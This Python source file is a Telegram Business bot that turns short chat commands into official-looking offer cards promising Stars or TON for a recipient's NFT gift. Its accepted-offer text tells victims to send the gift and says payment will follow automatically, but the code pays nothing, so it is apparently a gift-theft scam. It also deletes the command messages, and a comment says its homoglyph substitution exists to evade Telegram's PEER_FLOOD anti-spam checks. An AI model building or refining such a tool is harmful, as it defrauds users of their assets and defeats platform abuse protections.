import asyncio
import hmac
import html
import json
import logging
import math
import os
import random
import re
import time
import uuid

from aiohttp import ClientSession, ClientTimeout, web

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offers")

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_URL = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
SECRET = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API = f"{os.environ.get('TG_API', 'https://api.telegram.org')}/bot{BOT_TOKEN}"
DATA_FILE = os.environ.get("OFFERS_FILE", "offers.json")

BRAND = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
TRANSFER_MIN = int(os.environ.get("TRANSFER_MINUTES", 10))
STRICT = os.environ.get("OFFER_STRICT") == "1"
MAX_STARS = 100_000_000
UPDATES = ["message", "callback_query", "business_connection", "business_message"]
NBSP = "\u00a0"

OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
HOMOGLYPH_RATE_EN = float(os.environ.get("HOMOGLYPH_RATE_EN", "0.12"))
BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")
SEND_COOLDOWN = float(os.environ.get("SEND_COOLDOWN", "2.0"))

STARS_WORD_RU = "звeзд"
STARS_WORD_EN = "Stars"

LANG_ALIASES = {"en": "en", "ru": "ru", "rus": "ru"}

EMOJI_CROSS = "5260342697075416641"
EMOJI_CHECK = "5260416304224936047"
EMOJI_TG = "5258073068852485953"

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()
_last_send_by_bcid = {}


# ============ HOMOGLYPH STYLE ============
# Только ВИЗУАЛЬНО ИДЕНТИЧНЫЕ символы (латиница <-> кириллица/греческий).
# Rate 0.12 для EN: байты разные (обход PEER_FLOOD), глазами не видно.

_HOMOGLYPH = {
    # строчная латиница -> кириллица (визуально идентичны)
    "a": ["а"],
    "c": ["с"],
    "e": ["е"],
    "i": ["і"],
    "k": ["к"],
    "o": ["о"],
    "p": ["р"],
    "x": ["х"],
    "y": ["у"],
    # заглавная латиница -> кириллица (визуально идентичны)
    "A": ["А"],
    "B": ["В"],
    "C": ["С"],
    "E": ["Е"],
    "H": ["Н"],
    "I": ["І"],
    "K": ["К"],
    "M": ["М"],
    "O": ["О"],
    "P": ["Р"],
    "T": ["Т"],
    "X": ["Х"],
    "Y": ["У"],
    # кириллица -> латиница/греческий (для RU)
    "а": ["a", "α"],
    "с": ["c"],
    "е": ["e"],
    "о": ["o", "ο"],
    "р": ["p", "ρ"],
    "х": ["x"],
    "у": ["y"],
    "к": ["κ"],
    "А": ["A"],
    "В": ["B"],
    "Е": ["E"],
    "К": ["K"],
    "М": ["M"],
    "Н": ["H"],
    "О": ["O"],
    "Р": ["P"],
    "С": ["C"],
    "Т": ["T"],
    "У": ["Y"],
    "Х": ["X"],
    "І": ["I"],
    "Ј": ["J"],
    "Ѕ": ["S"],
}

_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)


def _style_plain(s: str, rate: float) -> str:
    res = []
    for ch in s:
        variants = _HOMOGLYPH.get(ch)
        if variants and random.random() < rate:
            res.append(random.choice(variants))
        else:
            res.append(ch)
    return "".join(res)


def style(text: str, lang: str = "ru") -> str:
    rate = HOMOGLYPH_RATE_EN if lang == "en" else HOMOGLYPH_RATE
    if rate <= 0:
        return text
    out = []
    pos = 0
    depth = 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk, rate) if depth == 0 else chunk)
        out.append(m.group(0))
        if m.group(1) == "/":
            depth = max(0, depth - 1)
        else:
            depth += 1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail, rate) if depth == 0 else tail)
    return "".join(out)


# ============ HELPERS ============

def esc(s):
    return html.escape(str(s))


def num(x):
    return f"{x:,}".replace(",", " ")


def btn(text, data, icon_id=None):
    b = {"text": text, "callback_data": data}
    if icon_id:
        b["icon_custom_emoji_id"] = icon_id
    if BUTTON_STYLE:
        b["style"] = BUTTON_STYLE
    return b


def _task_done(task):
    tasks.discard(task)
    if task.cancelled():
        return
    exc = task.exception()
    if exc:
        log.error("background task failed: %s", exc, exc_info=exc)


def background(coro):
    task = asyncio.create_task(coro)
    tasks.add(task)
    task.add_done_callback(_task_done)
    return task


def _log_preview(text, n=80):
    if not text:
        return ""
    flat = text.replace("\n", " | ")
    return flat[:n] + ("..." if len(flat) > n else "")


def _is_flood(desc: str) -> bool:
    return "PEER_FLOOD" in (desc or "")


async def api(method, **params):
    async with http.post(
        f"{API}/{method}",
        json=params
    ) as resp:
        data = await resp.json()

    if not data.get("ok"):
        desc = data.get("description") or ""
        extra = ""
        if _is_flood(desc):
            extra = (f" | FLOOD chat={params.get('chat_id')}"
                     f" | bcid={params.get('business_connection_id')}"
                     f" | text={_log_preview(params.get('text'), 60)!r}")
        log.warning(
            "Telegram API error | method=%s | code=%s | description=%s%s | parameters=%s",
            method,
            data.get("error_code"),
            desc,
            extra,
            data.get("parameters")
        )

    return data


async def _throttle_send(bcid):
    if not bcid:
        return
    last = _last_send_by_bcid.get(bcid, 0)
    now = time.time()
    wait = last + SEND_COOLDOWN - now
    if wait > 0:
        log.info("send cooldown | bcid=%s | wait=%.2fs", bcid, wait)
        await asyncio.sleep(wait)
    _last_send_by_bcid[bcid] = time.time()


async def send(chat, text, kb=None, bcid=None, preview=False, lang="ru"):
    if not chat:
        log.warning("send: chat is None, skip | lang=%s | preview=%r", lang, _log_preview(text, 40))
        return {"ok": False, "description": "no chat"}
    await _throttle_send(bcid)
    styled = style(text, lang)
    log.info(
        "send | chat=%s | bcid=%s | lang=%s | preview=%r | raw_len=%s | styled_len=%s",
        chat, bcid, lang, _log_preview(styled, 60), len(text), len(styled)
    )
    params = dict(chat_id=chat, text=styled, parse_mode="HTML")
    params["link_preview_options"] = {"is_disabled": not preview}
    if kb:
        params["reply_markup"] = kb
    if bcid:
        params["business_connection_id"] = bcid
    res = await api("sendMessage", **params)
    if res.get("ok"):
        log.info("send OK | chat=%s | mid=%s", chat, res.get("result", {}).get("message_id"))
    else:
        log.warning("send FAIL | chat=%s | desc=%s", chat, res.get("description"))
    return res


async def delete_business_message(bcid, mid):
    if not bcid or not mid:
        return {"ok": False}
    return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])


async def edit_offer(o, text, kb=None, preview=True):
    if not o.get("mid"):
        return {"ok": False, "description": "no mid"}
    lang = o.get("lang", "ru")
    styled = style(text, lang)
    log.info(
        "edit | chat=%s | mid=%s | bcid=%s | lang=%s | preview=%r | raw_len=%s | styled_len=%s",
        o.get("chat"), o.get("mid"), o.get("bcid"), lang,
        _log_preview(styled, 60), len(text), len(styled)
    )
    params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                  text=styled, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
    params["link_preview_options"] = {"is_disabled": not preview}
    res = await api("editMessageText", **params)
    if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
        return {"ok": True}
    if not res.get("ok"):
        log.warning("edit FAIL | mid=%s | desc=%s", o.get("mid"), res.get("description"))
    return res


FATAL_DESC_MARKERS = (
    "invalid message identifier",
    "message to edit not found",
    "business_connection_invalid",
    "business connection invalid",
)


def _is_fatal_desc(desc: str) -> bool:
    d = (desc or "").lower()
    return any(m in d for m in FATAL_DESC_MARKERS)


async def render_card(o, text, kb, preview=True):
    res = await edit_offer(o, text, kb, preview=preview)
    if res.get("ok"):
        return res
    desc = res.get("description") or ""
    if _is_fatal_desc(desc):
        log.warning("карточка %s мертва (%s), помечаю dead", o.get("id"), desc)
        o["status"] = "dead"
        save()
        return {"ok": False, "description": "dead"}
    if _is_flood(desc):
        log.warning("edit FLOOD для %s, пропускаю пересоздание", o.get("id"))
        return res
    log.warning("edit упал (%s), пересоздаю карточку %s", desc, o["id"])
    res2 = await send(o["chat"], text, kb, o["bcid"], preview=preview, lang=o.get("lang", "ru"))
    if res2.get("ok"):
        o["mid"] = res2["result"]["message_id"]
        save()
        return res2
    desc2 = res2.get("description") or ""
    if _is_fatal_desc(desc2):
        o["status"] = "dead"
        save()
    log.error("не удалось пересоздать карточку %s: %s", o["id"], desc2)
    return res2


async def validate_connections():
    if not connections and not offers:
        return
    valid = set()
    bcids = set(connections.keys())
    for o in offers.values():
        if o.get("bcid") and o.get("status") in ("pending", "accepted"):
            bcids.add(o["bcid"])
    for bcid in bcids:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            valid.add(bcid)
            if bcid not in connections:
                connections[bcid] = conn_from(res["result"])
        else:
            log.warning("bcid %s невалиден, офферы с ним станут dead", bcid)
    for o in offers.values():
        if o.get("bcid") not in valid and o.get("status") in ("pending", "accepted"):
            o["status"] = "dead"
    save()


def save():
    for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
        del offers[oid]
    tmp = f"{DATA_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"connections": connections, "offers": offers}, f, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", DATA_FILE, e)


def load():
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        return
    except (OSError, ValueError) as e:
        log.error("%s не читается: %s", DATA_FILE, e)
        return
    connections.update(data.get("connections", {}))
    offers.update(data.get("offers", {}))


NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
TON_ADDRESS = re.compile(r"(?:EQ|UQ)[A-Za-z0-9_-]{46}", re.I)


def usage(lang: str) -> str:
    if lang == "en":
        return ("Format:\n"
                "<code>ooo link amount [en|ru]</code> (Stars)\n"
                "<code>ttt link amount [en|ru]</code> (TON)\n"
                "<code>ttt link address amount [en|ru]</code> (TON to wallet)")
    return ("Формат:\n"
            "<code>ooo ссылка сумма [en|ru]</code> (звeзды)\n"
            "<code>ttt ссылка сумма [en|ru]</code> (TON)\n"
            "<code>ttt ссылка адрес сумма [en|ru]</code> (TON на кошелек)")


def split_lang(arg: str):
    tokens = arg.split()
    for i, tok in enumerate(tokens):
        lang = LANG_ALIASES.get(tok.lower())
        if lang:
            rest = " ".join(tokens[:i] + tokens[i + 1:])
            log.info("split_lang | arg=%r | token=%r at %s | lang=%s | rest=%r",
                     arg, tok, i, lang, rest)
            return rest, lang
    log.info("split_lang | arg=%r | no lang token found -> ru", arg)
    return arg, "ru"


def gift_name(slug):
    m = SLUG.match(slug)
    if not m:
        return None
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"


def parse_offer(arg, currency="STARS"):
    link = NFT_LINK.search(arg)
    if not link:
        return None, "no_nft_link"
    slug = link.group(1)
    name = gift_name(slug)
    if not name:
        return None, "bad_slug"

    rest = f"{arg[:link.start()]} {arg[link.end():]}".strip()

    address = None
    if currency == "TON":
        address_match = TON_ADDRESS.search(rest)
        if address_match:
            address = address_match.group(0)
            rest = rest.replace(address, "")

    amount = re.search(r"\d[\d_,]*", rest)
    if not amount:
        return None, "no_amount"
    val = int(re.sub(r"[_,]", "", amount.group()))

    if not 1 <= val <= MAX_STARS:
        return None, "bad_amount"

    return {"slug": slug, "name": name, "amount": val, "address": address}, None


ERROR_TEXT = {
    "ru": {
        "no_nft_link": "Не нашёл ссылку на NFT вида https://t.me/nft/DurovsCap-1234",
        "bad_slug": "Это не похоже на ссылку на NFT: в конце должен быть номер.",
        "no_amount": "Не нашёл сумму.",
        "bad_amount": f"Сумма должна быть от 1 до {num(MAX_STARS)}.",
        "send_failed": "Ошибка: ",
    },
    "en": {
        "no_nft_link": "No NFT link found (https://t.me/nft/DurovsCap-1234)",
        "bad_slug": "Not an NFT link: must end with a number.",
        "no_amount": "No amount found.",
        "bad_amount": f"Amount must be 1 to {num(MAX_STARS)}.",
        "send_failed": "Error: ",
    },
}


def maker_label(o):
    u = o["maker"]
    return esc(u.get("name") or u.get("username") or "пользователь")


def gift_link(o):
    return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'


def left_text(seconds, lang="ru"):
    minutes = math.ceil(max(0, seconds) / 60)
    h, m = divmod(minutes, 60)
    if lang == "en":
        return f"{h}h {m}m" if h else f"{m}m"
    return f"{h} ч. {m} мин." if h else f"{m} мин."


def _lang(o):
    return o.get("lang", "ru")


def offer_text(o):
    lang = _lang(o)
    if o.get("currency") == "TON":
        if lang == "en":
            addr_text = f" to <code>{esc(o['address'])}</code>" if o.get("address") else ""
            amount = f"{num(o['amount'])} TON"
            return (f"<b>{maker_label(o)}</b> offers you <b>{amount}</b>{addr_text} for the gift {gift_link(o)}.\n\n"
                    f"This offer is valid for {left_text(o['expires'] - time.time(), lang)}.")
        addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time(), lang)}")
    else:
        if lang == "en":
            amount = f'{num(o["amount"])} {STARS_WORD_EN}'
            return (f"<b>{maker_label(o)}</b> offers you <b>{amount}</b> for the gift {gift_link(o)}.\n\n"
                    f"This offer is valid for {left_text(o['expires'] - time.time(), lang)}.")
        amount = f'{num(o["amount"])} {STARS_WORD_RU}'
        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time(), lang)}")
    return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")


def accepted_text(o):
    lang = _lang(o)
    u = o["maker"]
    username = u.get("username") or ("пользователя" if lang == "ru" else "user")

    if o.get("currency") == "TON":
        if lang == "en":
            addr_text = f" <code>{esc(o['address'])}</code>" if o.get("address") else ""
            amount = f"{num(o['amount'])} TON"
            return (f"<b>Offer accepted!</b>\n\n"
                    f"Send {gift_link(o)} to @{esc(username)} to close the deal.\n"
                    f"After that, <b>{amount}</b> will be credited to your balance{addr_text}.")
        addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        return (
            f"<b>Сделка принята!</b>\n\n"
            f"Передайте подарок {gift_link(o)} "
            f"пользователю @{esc(username)} для успешного закрытия сделки, "
            f"после чего <b>{amount}</b> автоматически отправятся на ваш баланс{addr_text}."
        )
    if lang == "en":
        amount = f'{num(o["amount"])} {STARS_WORD_EN}'
        return (f"<b>Offer accepted!</b>\n\n"
                f"Send {gift_link(o)} to @{esc(username)} to close the deal.\n"
                f"After that, <b>{amount}</b> will be credited to your balance.")
    amount = f'{num(o["amount"])} {STARS_WORD_RU}'
    return (
        f"<b>Сделка принята!</b>\n\n"
        f"Передайте подарок {gift_link(o)} "
        f"пользователю @{esc(username)} для успешного закрытия сделки, "
        f"после чего <b>{amount}</b> отправятся на ваш баланс."
    )


def sold_text(o):
    return accepted_text(o)


def declined_text(o):
    return "Offer declined." if _lang(o) == "en" else "Отклонено."


def expired_text(o):
    return "This offer has expired." if _lang(o) == "en" else "Предложение истекло."


def done_text(o):
    if _lang(o) == "en":
        return f"Confirmed. The deal for {gift_link(o)} is closed."
    return f"Передача подтверждена. Сделка по {gift_link(o)} закрыта."


def offer_kb(o):
    lang = _lang(o)
    if lang == "en":
        return {
            "inline_keyboard": [[
                btn("Decline", f"of:no:{o['id']}", EMOJI_CROSS),
                btn("Accept", f"of:ok:{o['id']}", EMOJI_CHECK),
            ]]
        }
    return {
        "inline_keyboard": [[
            btn("Отклонить", f"of:no:{o['id']}", EMOJI_CROSS),
            btn("Принять", f"of:ok:{o['id']}", EMOJI_CHECK),
        ]]
    }


def accepted_kb(o):
    lang = _lang(o)
    u = o["maker"]
    if u.get("username"):
        transfer_url = f"tg://send_gift?to={u['username']}"
    else:
        transfer_url = f"tg://user?id={u.get('id', 0)}"

    cancel_text = "Cancel" if lang == "en" else "Отменить"
    transfer_text = "Send" if lang == "en" else "Передать"

    return {
        "inline_keyboard": [[
            btn(cancel_text, f"of:cancel:{o['id']}", EMOJI_CROSS),
            {
                "text": transfer_text,
                "url": transfer_url,
                "icon_custom_emoji_id": EMOJI_TG,
            },
        ]]
    }


def sold_kb(o):
    return accepted_kb(o)


async def make_offer(m, maker, bcid, arg, currency="STARS", lang="ru"):
    parsed, error = parse_offer(arg, currency)
    chat = m["chat"]["id"]
    now = time.time()

    log.info(
        "make_offer | chat=%s | bcid=%s | currency=%s | lang=%s | arg=%r | parse_error=%s",
        chat, bcid, currency, lang, arg, error
    )

    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass

    if lang not in ("ru", "en"):
        log.warning("make_offer: unexpected lang=%r, falling back to ru", lang)
        lang = "ru"

    if error:
        err_text = ERROR_TEXT.get(lang, ERROR_TEXT["ru"]).get(error, error)
        return await send(chat, f"{esc(err_text)}\n\n{usage(lang)}", bcid=bcid, preview=False, lang=lang)

    o = {"id": uuid.uuid4().hex[:8], **parsed, "currency": currency, "lang": lang, "bcid": bcid,
         "chat": chat, "mid": None, "maker": maker, "status": "pending", "created": now,
         "expires": now + OFFER_TTL}
    offers[o["id"]] = o
    save()

    text_preview = offer_text(o)
    log.info(
        "make_offer -> card | id=%s | lang=%s | currency=%s | preview=%r",
        o["id"], lang, currency, _log_preview(text_preview, 80)
    )

    res = await send(chat, text_preview, offer_kb(o), bcid=bcid, preview=True, lang=lang)
    if res.get("ok"):
        o["mid"] = res["result"]["message_id"]
        save()
        return
    desc = res.get("description", "")
    if _is_fatal_desc(desc):
        o["status"] = "dead"
        save()
        return
    if _is_flood(desc):
        log.warning("make_offer FLOOD | chat=%s | lang=%s | удаляю оффер %s",
                    chat, lang, o["id"])
        offers.pop(o["id"], None)
        save()
        return
    offers.pop(o["id"], None)
    save()
    return await send(chat, f"{ERROR_TEXT[lang]['send_failed']}{esc(desc)}", bcid=bcid, lang=lang)


FINAL = {
    "accepted": (accepted_text, accepted_kb),
    "declined": (declined_text, None),
    "expired": (expired_text, None),
    "done": (done_text, None),
}


async def settle(o, status):
    prev_status = o.get("status")
    if status in ("declined", "expired"):
        o["status"] = status
        save()
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except Exception:
            pass
        return

    text, kb = FINAL[status]
    res = await edit_offer(o, text(o), kb(o) if kb else None, preview=True)
    if res.get("ok"):
        o["status"] = status
        save()
        return
    desc = res.get("description") or ""
    if _is_fatal_desc(desc):
        o["status"] = "dead"
        save()
        return
    if _is_flood(desc):
        log.warning("settle FLOOD | id=%s | status=%s | оставляю как было", o.get("id"), status)
        if prev_status:
            o["status"] = prev_status
            save()
        return
    log.warning("settle: edit failed (%s) для %s, статус не меняю", desc, o.get("id"))


async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] not in ("pending", "accepted"):
                continue
            try:
                if o["status"] == "pending" and o["expires"] < time.time():
                    await settle(o, "expired")
            except Exception:
                pass


async def on_callback(q):
    parts = (q.get("data") or "").split(":")
    note = None
    from_id = (q.get("from") or {}).get("id")
    from_lang = (q.get("from") or {}).get("language_code", "ru")
    o = offers.get(parts[2]) if len(parts) == 3 and parts[0] == "of" else None
    if o is None:
        note = "Outdated." if from_lang == "en" else "Этот оффер устарел"
    else:
        lang = _lang(o)
        action = parts[1]
        if action == "cancel":
            try:
                await delete_business_message(o["bcid"], o["mid"])
            except Exception:
                pass
            o["status"] = "declined"
            save()
            return await api("answerCallbackQuery", callback_query_id=q["id"])
        elif action == "done":
            if o["status"] != "accepted":
                note = "Accept first." if lang == "en" else "Сначала нужно принять оффер"
            else:
                await settle(o, "done")
        elif STRICT and from_id == o["maker"]["id"] and action in ("ok", "no"):
            note = "Own offer." if lang == "en" else "Это твой оффер: отвечать на него должен получатель"
        elif action in ("ok", "no"):
            if o["status"] != "pending":
                note = "Already processed." if lang == "en" else "Оффер уже обработан"
            elif time.time() > o["expires"]:
                await settle(o, "expired")
                note = "Expired." if lang == "en" else "Срок предложения истёк"
            else:
                await settle(o, "accepted" if action == "ok" else "declined")
    extra = {"text": note, "show_alert": True} if note else {}
    await api("answerCallbackQuery", callback_query_id=q["id"], **extra)


def conn_from(c):
    rights = c.get("rights")
    rights = rights if isinstance(rights, dict) else {}
    can_reply = bool(rights.get("can_reply", c.get("can_reply")))
    can_delete = bool(c.get("can_delete_all_messages"))
    user = c["user"]
    return {"id": c["id"], "user_id": user["id"],
            "chat": c.get("user_chat_id"),
            "name": user.get("first_name", ""),
            "username": user.get("username"), "enabled": c.get("is_enabled", True),
            "can_reply": can_reply, "can_delete": can_delete}


async def on_connection(c):
    conn = conn_from(c)
    connections[conn["id"]] = conn
    save()
    if not conn["chat"]:
        log.info("connection %s без user_chat_id — пропускаю приветствие", conn["id"])
        return
    if not conn["enabled"]:
        text = "Bot disconnected. Reconnect: Settings -> Telegram Business -> Chat Automation."
    elif not conn["can_reply"]:
        text = ("Bot connected, but no reply permission. Open Settings -> Telegram Business -> "
                "Chat Automation, enable the permission — otherwise offers won't be created.")
    else:
        text = ("<b>Connected.</b>\n\n"
                "In any chat:\n"
                "<code>ooo link amount [en|ru]</code> (Stars)\n"
                "<code>ttt link amount [en|ru]</code> (TON)\n"
                "<code>ttt link address amount [en|ru]</code> (TON to wallet)\n\n"
                "The message will turn into an offer card.")
        if not conn["can_delete"]:
            text += ("\n\nWithout \"Delete messages\" permission, the command stays in chat — "
                    "enable it in the same settings.")
    await send(conn["chat"], text, lang="en")


async def get_connection(bcid):
    conn = connections.get(bcid)
    if conn is None:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            conn = connections[bcid] = conn_from(res["result"])
            save()
    return conn


async def on_business_message(m):
    text = (m.get("text") or "").strip()
    cmd, _, raw_arg = text.partition(" ")
    cmd = cmd.lower()
    raw_arg = raw_arg.strip()

    log.info("on_business_message | text=%r | cmd=%r | raw_arg=%r", text, cmd, raw_arg)

    if cmd == "ooo":
        currency = "STARS"
    elif cmd == "ttt":
        currency = "TON"
    else:
        log.info("on_business_message: unknown cmd=%r, skip", cmd)
        return

    arg, lang = split_lang(raw_arg)

    conn = await get_connection(m["business_connection_id"])
    frm = m.get("from") or {}
    if not conn or frm.get("id") != conn["user_id"]:
        log.info("on_business_message: conn missing or from mismatch")
        return
    if not conn["chat"]:
        log.warning("on_business_message: conn['chat'] is None, skip")
        return
    if not (conn["enabled"] and conn["can_reply"]):
        return await send(conn["chat"], "У бота нет права отвечать на сообщения.", lang="ru")

    maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
    await make_offer(m, maker, conn["id"], arg, currency, lang)


async def on_message(m):
    chat = (m.get("chat") or {}).get("id")
    if not chat:
        return
    cmd = (m.get("text") or "").strip().split()[:1]
    cmd = cmd[0].split("@")[0].lower() if cmd else ""
    if cmd in ("/start", "/help"):
        copy_btn = {"text": "Скопировать юзернейм бота",
                    "copy_text": {"text": f"@{bot_name}"}}
        if BUTTON_STYLE:
            copy_btn["style"] = BUTTON_STYLE
        kb = {"inline_keyboard": [[copy_btn]]}
        await send(chat, "Привет!", kb)


async def handle(update):
    try:
        if "business_connection" in update:
            await on_connection(update["business_connection"])
        elif "business_message" in update:
            await on_business_message(update["business_message"])
        elif "callback_query" in update:
            await on_callback(update["callback_query"])
        elif "message" in update:
            await on_message(update["message"])
    except Exception:
        log.exception("апдейт %s", update.get("update_id"))


async def webhook(req):
    token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not SECRET:
        return web.Response(status=403)
    try:
        if not hmac.compare_digest(token.encode(), SECRET.encode()):
            return web.Response(status=403)
    except TypeError:
        return web.Response(status=403)
    try:
        update = await req.json()
    except ValueError:
        return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")


async def health(req):
    return web.Response(text="ok")


async def keepalive():
    while True:
        await asyncio.sleep(600)
        try:
            async with http.get(f"{PUBLIC_URL}/health") as resp:
                await resp.read()
        except Exception as e:
            log.warning("keepalive: %s", e)


async def poll_updates():
    await api("deleteWebhook")
    await asyncio.sleep(1)
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                background(handle(update))
            if not data.get("ok"):
                await asyncio.sleep(3)
        except Exception as e:
            log.warning("getUpdates: %s", e)
            await asyncio.sleep(3)


async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    load()
    me = (await api("getMe")).get("result") or {}
    if not me:
        raise SystemExit("BOT_TOKEN не подходит")
    bot_name = me["username"]
    log.info("юзернейм бота: @%s (https://t.me/%s)", bot_name, bot_name)
    await api("setMyCommands", commands=[{"command": "start", "description": "Подключение"}])
    await validate_connections()
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get("PORT", 10000))
        try:
            await web.TCPSite(runner, "0.0.0.0", port).start()
        except OSError as e:
            log.error("порт %s занят: %s", port, e)
            raise
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET,
                  allowed_updates=UPDATES, drop_pending_updates=True)
        background(keepalive())
    else:
        background(poll_updates())
    log.info("оффер-бот @%s запущен", bot_name)
    await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())
